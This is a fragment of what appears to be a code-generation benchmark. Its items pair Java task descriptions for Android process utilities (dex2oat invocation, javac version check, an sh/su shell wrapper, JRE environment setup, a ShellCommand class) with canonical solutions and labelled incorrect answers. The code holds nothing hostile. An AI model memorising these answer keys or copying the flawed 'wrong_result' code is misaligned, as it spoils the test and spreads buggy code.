    "Instruction": "Task Description: Create a Java class that facilitates the conversion of DEX files to OAT files using the Android dex2oat tool, handling process execution and stream management.\n\nClass Description: InterpretDex2OatHelper is a utility class that provides functionality to convert Android DEX files to OAT files by invoking the system's dex2oat tool. It handles process creation, stream consumption, and error checking during the conversion process.\n\nAttributes:\n- STREAM_CONSUMER: [Executor] - A single-thread executor used for consuming process output streams asynchronously.\n\nMethods:\n- getCurrentInstructionSet: () -> [String] - Retrieves the current instruction set architecture of the device using reflection.\n- interpretDex2Oat: (String dexFilePath, String oatFilePath) -> [void] - Main method that executes the dex2oat conversion process with appropriate parameters.\n- consumeInputStream: (InputStream is) -> [void] - Helper method that asynchronously consumes an input stream to prevent process blocking.\n\nMethod Details:\n1. getCurrentInstructionSet:\n   - Input: None\n   - Output: String representing the current instruction set\n   - Description: Uses reflection to call VMRuntime.getCurrentInstructionSet()\n\n2. interpretDex2Oat:\n   - Input: \n     - dexFilePath: String - Path to the input DEX file\n     - oatFilePath: String - Path for the output OAT file\n   - Output: void (throws IOException on failure)\n   - Description: \n     - Prepares the dex2oat command with version-specific parameters\n     - Creates and manages the conversion process\n     - Handles stream consumption and process termination\n\n3. consumeInputStream:\n   - Input: \n     - is: InputStream - Stream to be consumed\n   - Output: void\n   - Description: Asynchronously reads and discards stream contents to prevent blocking",
    "Canonical_solution": "import android.os.Build;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Method;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\n\npublic class InterpretDex2OatHelper {\n\n    private static String getCurrentInstructionSet() throws Exception {\n        Class<?> clazz = Class.forName(\"dalvik.system.VMRuntime\");\n        Method currentGet = clazz.getDeclaredMethod(\"getCurrentInstructionSet\");\n        return (String) currentGet.invoke(null);\n    }\n\n    public static void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String targetISA = null;\n        try {\n            targetISA = getCurrentInstructionSet();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        final File oatFile = new File(oatFilePath);\n        if (!oatFile.exists()) {\n            oatFile.getParentFile().mkdirs();\n        }\n\n        final List<String> commandAndParams = new ArrayList<>();\n        commandAndParams.add(\"dex2oat\");\n\n        if (Build.VERSION.SDK_INT >= 24) {\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"-classpath\");\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"&\");\n        }\n        commandAndParams.add(\"--dex-file=\" + dexFilePath);\n        commandAndParams.add(\"--oat-file=\" + oatFilePath);\n        commandAndParams.add(\"--instruction-set=\" + targetISA);\n\n        if (Build.VERSION.SDK_INT > 25) {\n            commandAndParams.add(\"--compiler-filter=quicken\");\n        } else {\n            commandAndParams.add(\"--compiler-filter=interpret-only\");\n        }\n\n        final ProcessBuilder pb = new ProcessBuilder(commandAndParams);\n        pb.redirectErrorStream(true);\n        final Process dex2oatProcess = pb.start();\n\n        StreamConsumer.consumeInputStream(dex2oatProcess.getInputStream());\n        StreamConsumer.consumeInputStream(dex2oatProcess.getErrorStream());\n\n        try {\n            final int ret = dex2oatProcess.waitFor();\n            if (ret != 0) {\n                throw new IOException(\"dex2oat works unsuccessfully, exit code: \" + ret);\n            }\n        } catch (InterruptedException e) {\n            throw new IOException(\"dex2oat is interrupted, msg: \" + e.getMessage(), e);\n        }\n    }\n\n    private static class StreamConsumer {\n        static final Executor STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n        static void consumeInputStream(final InputStream is) {\n            STREAM_CONSUMER.execute(new Runnable() {\n                @Override\n                public void run() {\n                    if (is == null) {\n                        return;\n                    }\n                    final byte[] buffer = new byte[256];\n                    try {\n                        while ((is.read(buffer)) > 0) {\n                            // To satisfy checkstyle rules.\n                        }\n                    } catch (IOException ignored) {\n                        // Ignored.\n                    } finally {\n                        try {\n                            is.close();\n                        } catch (Exception ignored) {\n                            // Ignored.\n                        }\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class InterpretDex2OatHelper {\n    private static final ExecutorService STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n    public String getCurrentInstructionSet() throws Exception {\n        Class<?> vmRuntimeClass = Class.forName(\"android.runtime.VMRuntime\");\n        Method method = vmRuntimeClass.getMethod(\"getCurrentInstructionSet\");\n        return (String) method.invoke(null);\n    }\n\n    public void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String instructionSet = getCurrentInstructionSet();\n        List<String> commands = new ArrayList<>();\n        commands.add(\"dex2oat\");\n        commands.add(\"--instruction-set\");\n        commands.add(instructionSet);\n        commands.add(\"--output\");\n        commands.add(oatFilePath);\n        commands.add(dexFilePath);\n        ProcessBuilder pb = new ProcessBuilder(commands);\n        pb.redirectErrorStream(false);\n        Process process = pb.start();\n        consumeInputStream(process.getInputStream());\n        consumeInputStream(process.getErrorStream());\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new IOException(\"dex2oat failed with exit code: \" + exitCode);\n        }\n    }\n\n    private void consumeInputStream(InputStream is) {\n        STREAM_CONSUMER.submit(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Discard the line\n                }\n            } catch (IOException e) {\n                // Handle exception, but not rethrowing here\n            }\n        });\n    }\n}"
  },
  {
    "Task_id": 285,
    "Instruction": "Task Description: Create a function that retrieves the version of the Java compiler installed on the system by executing the 'javac -version' command and capturing its output.\n\nFunction Description: The function uses Java's ProcessBuilder to launch an external process running the 'javac -version' command. It captures the command's output (which is redirected from stderr to stdout), reads the first line of output, and returns it as the version string. If any errors occur during this process, the function returns \"unknown\".\n\nInput: None (The function takes no input parameters)\n\nOutput: String - Returns the version string output by the 'javac -version' command (e.g., \"javac 1.8.0_291\"), or \"unknown\" if an error occurs during execution.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.lang.ProcessBuilder;\n\nprivate String getJavaCompilerVersion() {\n    ProcessBuilder pb = new ProcessBuilder(\"javac\", \"-version\");\n    pb.redirectErrorStream(true);\n\n    BufferedReader in = null;\n    try {\n        Process process = pb.start();\n        in = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String buffer = in.readLine();\n        process.waitFor();\n        return buffer;\n    } catch (Exception e) {\n        return \"unknown\";\n    } finally {\n        if (in != null) {\n            try {\n                in.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class JavaVersionChecker {\n    public static String getJavaCompilerVersion() {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"javac\", \"-version\");\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String version = reader.readLine();\n            int exitCode = process.waitFor();\n            if (exitCode == 0) {\n                return version;\n            } else {\n                return \"unknown\";\n            }\n        } catch (Exception e) {\n            return \"unknown\";\n        }\n    }\n}"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Create a Java class that manages an interactive shell process (either regular or root) with proper stream handling, command execution, and event notification capabilities.\n\nClass Description: The ShellStream class provides an interface to execute commands in a shell process (sh or su) while managing input/output streams and notifying listeners about process events. It handles command execution synchronization, stream monitoring, and process lifecycle management.\n\nAttributes:\n- mConnection: Process - The running shell process instance\n- mStdInput: DataOutputStream - Stream for writing commands to the process\n- mStdOutput: BufferedReader - Stream for reading process output\n- mStdOutputWorker: Thread - Worker thread for monitoring output stream\n- mListener: OnStreamListener - Callback interface for process events\n- mCounter: Counter - Thread-safe counter for active commands\n- mLock: Object - Synchronization lock object\n- mIsActive: Boolean - Flag indicating if the process is active\n- mIsRoot: Boolean - Flag indicating if using root shell (su)\n- mCommandEnd: String - Unique marker for command termination\n\nMethods:\n- ShellStream(Boolean requestRoot, OnStreamListener listener) -> void - Constructor that initializes the shell process (root or regular) and sets up stream handlers\n- execute(String command) -> void - Executes a shell command asynchronously and tracks its completion\n- waitFor() -> Boolean - Waits indefinitely for all commands to complete\n- waitFor(Integer timeout) -> Boolean - Waits with timeout for all commands to complete\n- waitFor(Integer timeout, Integer index) -> Boolean - Internal wait method with timeout and counter adjustment\n- isActive() -> Boolean - Returns if the shell process is active\n- isRunning() -> Boolean - Returns if any commands are currently executing\n- isRoot() -> Boolean - Returns if using root shell\n- destroy() -> void - Cleanly terminates the shell process and releases resources\n\nNested Interfaces:\n- OnStreamListener: Interface for process event callbacks\n  - onStreamStart(): Notifies when command execution starts\n  - onStreamInput(String): Provides process output lines\n  - onStreamStop(Integer): Notifies when command completes with exit code\n  - onStreamDied(): Notifies when process terminates unexpectedly\n\nNested Classes:\n- Counter: Thread-safe counter implementation\n  - size() -> Integer: Gets current count\n  - encrease() -> Integer: Increments counter\n  - decrease() -> Integer: Decrements counter\n  - reset() -> void: Resets counter to zero",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport android.util.Log;\n\npublic class ShellStream {\n    public static final String TAG = Common.TAG + \".ShellStream\";\n    \n    protected Process mConnection;\n    protected DataOutputStream mStdInput;\n    protected BufferedReader mStdOutput;\n    protected Thread mStdOutputWorker;\n    protected OnStreamListener mListener;\n    protected final Counter mCounter = new Counter();\n    protected final Object mLock = new Object();\n    protected Boolean mIsActive = false;\n    protected Boolean mIsRoot = false;\n    protected String mCommandEnd = \"EOL:a00c38d8:EOL\";\n    \n    protected static class Counter {\n        private volatile Integer mCount = 0;\n        private volatile Object mLock = new Object();\n        \n        public Integer size() {\n            synchronized(mLock) {\n                return mCount;\n            }\n        }\n        \n        public Integer encrease() {\n            synchronized(mLock) {\n                return (mCount += 1);\n            }\n        }\n        \n        public Integer decrease() {\n            synchronized(mLock) {\n                return mCount > 0 ? (mCount -= 1) : (mCount = 0);\n            }\n        }\n        \n        public void reset() {\n            synchronized(mLock) {\n                mCount = 0;\n            }\n        }\n    }\n    \n    public static interface OnStreamListener {\n        public void onStreamStart();\n        public void onStreamInput(String outputLine);\n        public void onStreamStop(Integer resultCode);\n        public void onStreamDied();\n    }\n    \n    public ShellStream(Boolean requestRoot, OnStreamListener listener) {\n        try {\n            if(Common.DEBUG)Log.d(TAG, \"Construct: Establishing a new shell stream\");\n            \n            ProcessBuilder builder = new ProcessBuilder(requestRoot ? \"su\" : \"sh\");\n            builder.redirectErrorStream(true);\n            \n            mIsRoot = requestRoot;\n            mIsActive = true;\n            mListener = listener;\n            mConnection = builder.start();\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            \n            mStdOutputWorker = new Thread() {\n                @Override\n                public void run() {\n                    String output = null;\n                    \n                    try {\n                        while (mIsActive && (output = mStdOutput.readLine()) != null) {\n                            if (mListener != null && mCounter.size() > 0) {\n                                if (output.contains(mCommandEnd)) {\n                                    Integer result = 0;\n                                    \n                                    try {\n                                        if (output.startsWith(mCommandEnd)) {\n                                            result = Integer.parseInt(output.substring(mCommandEnd.length()+1));\n                                            \n                                        } else {\n                                            result = 1;\n                                        }\n                                        \n                                    } catch (Throwable e) {\n                                        Log.w(TAG, e.getMessage(), e);\n                                    }\n                                    \n                                    mListener.onStreamStop(result);\n                                    mCounter.decrease();\n                                    \n                                    synchronized(mLock) {\n                                        mLock.notifyAll();\n                                    }\n                                    \n                                } else {\n                                    mListener.onStreamInput(output);\n                                }\n                            }\n                        }\n                        \n                    } catch (IOException e) {\n                        Log.w(TAG, e.getMessage(), e); output = null;\n                    }\n                    \n                    if (output == null) {\n                        ShellStream.this.destroy();\n                    }\n                }\n            };\n            \n            mStdOutputWorker.start();\n            \n        } catch (IOException e) {\n            Log.w(TAG, e.getMessage(), e); mIsActive = false;\n        }\n    }\n    \n    public synchronized void execute(final String command) {\n        final Object lock = new Object();\n        \n        new Thread() {\n            @Override\n            public void run() {\n                mCounter.encrease();\n                \n                synchronized(lock) {\n                    lock.notifyAll();\n                }\n                \n                synchronized(mLock) {\n                    if (waitFor(0, -1)) {\n                        mListener.onStreamStart();\n                        \n                        String input = command + \"\\n\";\n                        input += \"    echo \" + mCommandEnd + \" $?\\n\";\n                        \n                        try {\n                            mStdInput.write( input.getBytes() );\n                            \n                            if (mStdInput != null) {\n                                mStdInput.flush();\n                            }\n                            \n                        } catch (IOException e) {\n                            Log.w(TAG, e.getMessage(), e);\n                        }\n                    }\n                }\n            }\n            \n        }.start();\n        \n        synchronized (lock) {\n            try {\n                lock.wait();\n                \n            } catch (InterruptedException e) {}\n        }\n    }\n    \n    public Boolean waitFor() {\n        return waitFor(0, 0);\n    }\n    \n    public Boolean waitFor(Integer timeout) {\n        return waitFor(timeout, 0);\n    }\n    \n    protected Boolean waitFor(Integer timeout, Integer index) {\n        Integer counter = mCounter.size()+index;\n        \n        if (counter > 0) {\n            Long timeoutMilis = timeout > 0 ? System.currentTimeMillis() + timeout : 0L;\n            \n            synchronized(mLock) {\n                while (mCounter.size() > 0 && mIsActive) {\n                    try {\n                        counter -= 1;\n                        \n                        mLock.wait(timeout.longValue());\n                        \n                        if (timeout > 0 && System.currentTimeMillis() >= timeoutMilis) {\n                            return mCounter.size() == 0 && mIsActive;\n                            \n                        } else if (counter <= 0) {\n                            return mIsActive;\n                        }\n                        \n                    } catch (InterruptedException e) {\n                        Log.w(TAG, e.getMessage(), e);\n                    }\n                }\n            }\n        }\n        \n        return mIsActive;\n    }\n    \n    public Boolean isActive() {\n        return mIsActive;\n    }\n    \n    public Boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n    \n    public Boolean isRoot() {\n        return mIsRoot;\n    }\n    \n    public synchronized void destroy() {\n        if (mStdInput != null) {\n            mIsActive = false;\n            \n            mCounter.reset();\n            \n            try {\n                mStdInput.close();\n                mStdInput = null;\n                \n            } catch (IOException e) {}\n            \n            mStdOutputWorker.interrupt();\n            mStdOutputWorker = null;\n            \n            synchronized (mLock) {\n                mLock.notifyAll();\n            }\n            \n            mListener.onStreamDied();\n            mListener = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellStream {\n    private Process mConnection;\n    private DataOutputStream mStdInput;\n    private BufferedReader mStdOutput;\n    private Thread mStdOutputWorker;\n    private OnStreamListener mListener;\n    private Counter mCounter;\n    private Object mLock = new Object();\n    private boolean mIsActive = false;\n    private boolean mIsRoot = false;\n    private String mCommandEnd = \"exit\";\n\n    public ShellStream(boolean requestRoot, OnStreamListener listener) {\n        mListener = listener;\n        mIsRoot = requestRoot;\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"sh\");\n            if (requestRoot) {\n                pb.command(\"su\");\n            }\n            pb.redirectErrorStream(true);\n            mConnection = pb.start();\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            mCounter = new Counter();\n            mIsActive = true;\n            mStdOutputWorker = new Thread(this::readOutput);\n            mStdOutputWorker.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void execute(String command) {\n        synchronized (mLock) {\n            if (!mIsActive) {\n                return;\n            }\n            try {\n                mStdInput.writeBytes(command + \"\\n\");\n                mStdInput.flush();\n                mCounter.increase();\n                mListener.onStreamStart();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void readOutput() {\n        String line;\n        try {\n            while ((line = mStdOutput.readLine()) != null) {\n                if (line.contains(mCommandEnd)) {\n                    mListener.onStreamStop(mConnection.exitValue());\n                    mCounter.decrease();\n                    break;\n                }\n                mListener.onStreamInput(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            mListener.onStreamDied();\n        }\n    }\n\n    public boolean waitFor() {\n        return waitFor(Integer.MAX_VALUE);\n    }\n\n    public boolean waitFor(int timeout) {\n        return waitFor(timeout, -1);\n    }\n\n    private boolean waitFor(int timeout, int index) {\n        synchronized (mLock) {\n            long startTime = System.currentTimeMillis();\n            while (mCounter.size() > 0) {\n                long elapsed = System.currentTimeMillis() - startTime;\n                if (elapsed >= timeout) {\n                    return false;\n                }\n                try {\n                    mLock.wait(1000);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    return false;\n                }\n            }\n            return true;\n        }\n    }\n\n    public boolean isActive() {\n        return mIsActive;\n    }\n\n    public boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n\n    public boolean isRoot() {\n        return mIsRoot;\n    }\n\n    public void destroy() {\n        synchronized (mLock) {\n            if (mIsActive) {\n                mIsActive = false;\n                try {\n                    if (mConnection != null) {\n                        mConnection.destroy();\n                        mConnection.waitFor();\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                } finally {\n                    mListener.onStreamDied();\n                }\n            }\n        }\n    }\n\n    public interface OnStreamListener {\n        void onStreamStart();\n        void onStreamInput(String line);\n        void onStreamStop(int exitCode);\n        void onStreamDied();\n    }\n\n    public class Counter {\n        private int count = 0;\n\n        public synchronized int size() {\n            return count;\n        }\n\n        public synchronized int increase() {\n            return ++count;\n        }\n\n        public synchronized int decrease() {\n            return --count;\n        }\n\n        public synchronized void reset() {\n            count = 0;\n        }\n    }\n}"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: The task involves creating a Java utility class that manages environment variables for a Java Runtime Environment (JRE) and handles log redirection from an external process. The class should provide methods to configure the JRE environment and redirect logs from the Android `logcat` command to a custom logger.\n\nClass Description: This utility class is designed to set up the JRE environment by configuring various system environment variables and redirecting logs from an external process (`logcat`) to a custom logger. It is particularly useful for Android applications that need to manage JRE environments and log outputs dynamically.\n\nAttributes:\n\n- `NATIVE_LIB_DIR`: String - The directory path for native libraries.\n- `LD_LIBRARY_PATH`: String - The library path for dynamic linking.\n- `LOCAL_RENDERER`: String - The renderer type for graphics (e.g., \"opengles3_desktopgl_angle_vulkan\").\n- `jvmLibraryPath`: String - The path to the JVM library (e.g., \"server/libjvm.so\" or \"client/libjvm.so\").\n- `logcatPb`: ProcessBuilder - A ProcessBuilder instance for executing the `logcat` command.\n- `failTime`: int - A counter to track the number of failed attempts to start the `logcat` process.\n\nMethods:\n\n- `redirectAndPrintJRELog()`: void - Starts a new thread to redirect and print JRE logs from the `logcat` command. The method configures the `logcat` command to filter specific log tags and redirects the output to a custom logger. If the process fails, it retries up to 10 times.\n- `setJavaEnvironment(Activity activity, String jreHome)`: void - Configures the JRE environment by setting various system environment variables. The method reads additional environment variables from a custom file (`custom_env.txt`) and applies them. It also sets the `LD_LIBRARY_PATH` and `PATH` variables to include the JRE binaries and native libraries.\n  - Input:\n    - `activity`: Activity - The Android activity context.\n    - `jreHome`: String - The home directory of the JRE.\n  - Output: None (void).\n- `setLdLibraryPath(String path)`: void - Sets the `LD_LIBRARY_PATH` environment variable to the specified path.\n  - Input:\n    - `path`: String - The new library path.\n  - Output: None (void).\n\nNote: The class assumes the presence of helper classes like `Logger`, `Tools`, `LauncherPreferences`, and `ExtraCore` for logging, file operations, and preference management. These dependencies should be handled appropriately in the implementation.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport android.system.Os;\nimport android.system.ErrnoException;\n\npublic static void redirectAndPrintJRELog() {\n    new Thread(new Runnable(){\n        int failTime = 0;\n        ProcessBuilder logcatPb;\n        @Override\n        public void run() {\n            try {\n                if (logcatPb == null) {\n                    logcatPb = new ProcessBuilder().command(\"logcat\", \"-v\", \"brief\", \"-s\", \"jrelog:I\", \"LIBGL:I\", \"NativeInput\").redirectErrorStream(true);\n                }\n\n                new ProcessBuilder().command(\"logcat\", \"-c\").redirectErrorStream(true).start();\n                java.lang.Process p = logcatPb.start();\n\n                byte[] buf = new byte[1024];\n                int len;\n                while ((len = p.getInputStream().read(buf)) != -1) {\n                    String currStr = new String(buf, 0, len);\n                    Logger.appendToLog(currStr);\n                }\n\n                if (p.waitFor() != 0) {\n                    failTime++;\n                    if (failTime <= 10) {\n                        run();\n                    } else {\n                        Logger.appendToLog(\"ERROR: Unable to get more log.\");\n                    }\n                }\n            } catch (Throwable e) {\n                Logger.appendToLog(\"Exception on logging thread:\\n\" + Log.getStackTraceString(e));\n            }\n        }\n    }).start();\n}\n\npublic static void setJavaEnvironment(Activity activity, String jreHome) throws Throwable {\n    Map<String, String> envMap = new ArrayMap<>();\n    envMap.put(\"POJAV_NATIVEDIR\", NATIVE_LIB_DIR);\n    envMap.put(\"JAVA_HOME\", jreHome);\n    envMap.put(\"HOME\", Tools.DIR_GAME_HOME);\n    envMap.put(\"TMPDIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"LIBGL_MIPMAP\", \"3\");\n    envMap.put(\"LIBGL_NOERROR\", \"1\");\n    envMap.put(\"LIBGL_NOINTOVLHACK\", \"1\");\n    envMap.put(\"LIBGL_NORMALIZE\", \"1\");\n\n    if(PREF_DUMP_SHADERS)\n        envMap.put(\"LIBGL_VGPU_DUMP\", \"1\");\n    if(PREF_ZINK_PREFER_SYSTEM_DRIVER)\n        envMap.put(\"POJAV_ZINK_PREFER_SYSTEM_DRIVER\", \"1\");\n    if(PREF_VSYNC_IN_ZINK)\n        envMap.put(\"POJAV_VSYNC_IN_ZINK\", \"1\");\n    if(Tools.deviceHasHangingLinker())\n        envMap.put(\"POJAV_EMUI_ITERATOR_MITIGATE\", \"1\");\n\n    envMap.put(\"LIBGL_ES\", (String) ExtraCore.getValue(ExtraConstants.OPEN_GL_VERSION));\n    envMap.put(\"FORCE_VSYNC\", String.valueOf(LauncherPreferences.PREF_FORCE_VSYNC));\n    envMap.put(\"MESA_GLSL_CACHE_DIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"force_glsl_extensions_warn\", \"true\");\n    envMap.put(\"allow_higher_compat_version\", \"true\");\n    envMap.put(\"allow_glsl_extension_directive_midshader\", \"true\");\n    envMap.put(\"MESA_LOADER_DRIVER_OVERRIDE\", \"zink\");\n    envMap.put(\"VTEST_SOCKET_NAME\", new File(Tools.DIR_CACHE, \".virgl_test\").getAbsolutePath());\n\n    envMap.put(\"LD_LIBRARY_PATH\", LD_LIBRARY_PATH);\n    envMap.put(\"PATH\", jreHome + \"/bin:\" + Os.getenv(\"PATH\"));\n    if(FFmpegPlugin.isAvailable) {\n        envMap.put(\"PATH\", FFmpegPlugin.libraryPath+\":\"+envMap.get(\"PATH\"));\n    }\n\n    if(LOCAL_RENDERER != null) {\n        envMap.put(\"POJAV_RENDERER\", LOCAL_RENDERER);\n        if(LOCAL_RENDERER.equals(\"opengles3_desktopgl_angle_vulkan\")) {\n            envMap.put(\"LIBGL_ES\", \"3\");\n            envMap.put(\"POJAVEXEC_EGL\",\"libEGL_angle.so\");\n        }\n    }\n\n    File customEnvFile = new File(Tools.DIR_GAME_HOME, \"custom_env.txt\");\n    if (customEnvFile.exists() && customEnvFile.isFile()) {\n        BufferedReader reader = new BufferedReader(new FileReader(customEnvFile));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            int index = line.indexOf(\"=\");\n            envMap.put(line.substring(0, index), line.substring(index + 1));\n        }\n        reader.close();\n    }\n\n    for (Map.Entry<String, String> env : envMap.entrySet()) {\n        try {\n            Os.setenv(env.getKey(), env.getValue(), true);\n        }catch (NullPointerException exception){\n            Log.e(\"JREUtils\", exception.toString());\n        }\n    }\n\n    File serverFile = new File(jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/server/libjvm.so\");\n    jvmLibraryPath = jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/\" + (serverFile.exists() ? \"server\" : \"client\");\n    setLdLibraryPath(jvmLibraryPath+\":\"+LD_LIBRARY_PATH);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class JreEnvUtil {\n    private static final String NATIVE_LIB_DIR = \"native_libs\";\n    private static final String LOCAL_RENDERER = \"local_renderer\";\n    private static final String JVM_LIBRARY_PATH = \"jvm_library_path\";\n    private ProcessBuilder logcatPb;\n    private int failTime = 0;\n\n    public void redirectAndPrintJRELog() {\n        new Thread(() -> {\n            int retries = 0;\n            while (retries < 10) {\n                try {\n                    logcatPb.command().clear();\n                    logcatPb.command(\"logcat\");\n                    logcatPb.command(\"-s\", \"mytag\");\n                    Process process = logcatPb.start();\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        Logger.log(line);\n                    }\n                    int exitCode = process.waitFor();\n                    if (exitCode == 0) {\n                        break;\n                    } else {\n                        retries++;\n                    }\n                } catch (Exception e) {\n                    retries++;\n                }\n            }\n        }).start();\n    }\n\n    public void setJavaEnvironment(Activity activity, String jreHome) {\n        File file = new File(activity.getFilesDir(), \"custom_env.txt\");\n        try {\n            BufferedReader br = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = br.readLine()) != null) {\n                String[] parts = line.split(\"=\");\n                if (parts.length == 2) {\n                    Map<String, String> env = System.getenv();\n                    env.put(parts[0], parts[1]);\n                }\n            }\n            br.close();\n        } catch (Exception e) {\n            // Handle exception\n        }\n        setLdLibraryPath(jreHome + File.separator + NATIVE_LIB_DIR);\n        String path = jreHome + File.separator + \"bin\";\n        Map<String, String> env = System.getenv();\n        env.put(\"PATH\", path);\n        logcatPb.environment().putAll(env);\n    }\n\n    public void setLdLibraryPath(String path) {\n        logcatPb.environment().put(\"LD_LIBRARY_PATH\", path);\n    }\n}"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of shell commands from within an Android application, providing methods to start, monitor, and interact with the external process, including reading its output and checking its exit status.\n\nClass Description: The ShellCommand class encapsulates functionality for executing shell commands, handling process I/O streams, and managing process lifecycle. It's designed for Android environments (evidenced by android.util.Log usage) and provides both synchronous and asynchronous operation modes.\n\nAttributes:\nrt: [Runtime] - Reference to Java Runtime environment for process execution\ncommand: [String[]] - Array containing the shell command and its arguments\ntag: [String] - Identifier for logging purposes\nprocess: [Process] - Reference to the running process instance\nstdout: [BufferedReader] - Reader for process output stream\nerror: [String] - Stores any error message encountered during execution\nexitval: [int] - Exit value of the completed process (-1 if not terminated)\n\nMethods:\nShellCommand: [constructor](String[] command) -> [void] - Initializes with command to execute\nShellCommand: [constructor](String[] command, String tag) -> [void] - Initializes with command and logging tag\nstart: [void](boolean waitForExit) -> [void] - Starts the process, optionally waiting for completion\nwaitForExit: [void]() -> [void] - Blocks until process completes while reading output\nfinish: [void]() -> [void] - Cleans up process resources\ncheckForExit: [boolean]() -> [boolean] - Checks if process has terminated\nstdoutAvailable: [boolean]() -> [boolean] - Checks if output is ready to read\nreadStdoutBlocking: [String]() -> [String] - Reads a line of output (blocks until available)\nreadStdout: [String]() -> [String] - Reads a line of output if available (non-blocking)",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ShellCommand {\n    Runtime rt;\n    String[] command;\n    String tag = \"\";\n    Process process;\n    BufferedReader stdout;\n    public String error;\n    public int exitval;\n\n    public ShellCommand(String[] command, String tag) {\n        this(command);\n        this.tag = tag;\n    }\n\n    public ShellCommand(String[] command) {\n        this.command = command;\n        rt = Runtime.getRuntime();\n    }\n\n    public void start(boolean waitForExit) {\n        exitval = -1;\n        error = null;\n\n        try {\n            process = new ProcessBuilder().command(command).redirectErrorStream(true).start();\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        } catch (Exception e) {\n            error = e.getCause().getMessage();\n            return;\n        }\n\n        if (waitForExit) {\n            waitForExit();\n        }\n    }\n\n    public void waitForExit() {\n        while (!checkForExit()) {\n            if (stdoutAvailable()) {\n                Log.d(\"AFWALL\", \"ShellCommand waitForExit [\" + tag\n                        + \"] discarding read: \" + readStdout());\n            } else {\n                try {\n                    Thread.sleep(100);\n                } catch (Exception e) {\n                    Log.d(\"AFWall\", \"waitForExit\", e);\n                }\n            }\n        }\n    }\n\n    public void finish() {\n        try {\n            if (stdout != null) {\n                stdout.close();\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"Exception finishing [\" + tag + \"]\", e);\n        }\n\n        if(process !=null) {\n            process.destroy();\n        }\n        process = null;\n    }\n\n    public boolean checkForExit() {\n        try {\n            if(process != null) {\n                exitval = process.exitValue();\n            } else {\n                finish();\n            }\n        } catch (IllegalThreadStateException e) {\n            return false;\n        }\n\n        finish();\n        return true;\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return stdout.ready();\n        } catch (java.io.IOException e) {\n            Log.e(\"AFWall\", \"stdoutAvailable error\", e);\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        String line;\n        if (stdout == null) {\n            return null;\n        }\n        try {\n            line = stdout.readLine();\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdoutBlocking error\", e);\n            return null;\n        }\n        if (line == null) {\n            return null;\n        } else {\n            return line + \"\\n\";\n        }\n    }\n\n    public String readStdout() {\n        if (stdout == null) {\n            return null;\n        }\n\n        try {\n            if (stdout.ready()) {\n                String line = stdout.readLine();\n                if (line == null) {\n                    return null;\n                } else {\n                    return line + \"\\n\";\n                }\n            } else {\n                return \"\";\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdout error\", e);\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
